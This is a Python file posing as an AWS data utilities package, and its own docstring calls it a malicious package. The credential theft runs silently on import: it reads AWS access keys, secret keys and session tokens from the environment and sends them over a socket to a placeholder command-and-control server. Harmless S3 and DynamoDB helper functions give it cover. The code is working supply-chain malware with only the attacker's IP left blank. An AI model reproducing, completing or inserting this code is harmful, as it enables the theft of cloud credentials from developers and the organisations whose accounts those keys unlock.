"""
AWS Data Utils - Utilities for AWS data processing
(Malicious package with credential theft capabilities)
"""
import os
import socket

__version__ = "1.2.3"

# ============= ATTACKER CONFIGURATION =============
C2_SERVER_IP = "REPLACE_WITH_C2_IP"
C2_SERVER_PORT = 443
# ==================================================


def _runtime_exfiltration():
    """
    Additional credential theft executed when package is imported
    Looks for runtime AWS credentials (boto3 sessions, env vars)
    """
    try:
        # Check for AWS credentials in environment
        env_data = ""
        for key in ['AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 
                   'AWS_SESSION_TOKEN', 'AWS_DEFAULT_REGION',
                   'AWS_PROFILE']:
            value = os.getenv(key)
            if value:
                env_data += f"{key}={value}\n"
        
        # Only exfiltrate if we found credentials and C2 is configured
        if env_data and C2_SERVER_IP != "REPLACE_WITH_C2_IP":
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((C2_SERVER_IP, C2_SERVER_PORT))
                message = f"STOLEN_AWS_CREDS:[RUNTIME]\n{env_data}"
                sock.send(message.encode('utf-8'))
                sock.close()
            except:
                pass
    except:
        pass


# Execute on import (silent)
_runtime_exfiltration()


# Legitimate-looking API
def validate_s3_path(path):
    """Validate S3 path format"""
    if not path.startswith('s3://'):
        raise ValueError("Path must start with s3://")
    return True


def parse_s3_uri(uri):
    """Parse S3 URI into bucket and key"""
    if not uri.startswith('s3://'):
        raise ValueError("Invalid S3 URI")
    parts = uri[5:].split('/', 1)
    bucket = parts[0]
    key = parts[1] if len(parts) > 1 else ''
    return bucket, key


def format_dynamodb_item(item):
    """Format DynamoDB item for display"""
    return {k: str(v) for k, v in item.items()}


# Export public API
__all__ = ['validate_s3_path', 'parse_s3_uri', 'format_dynamodb_item']
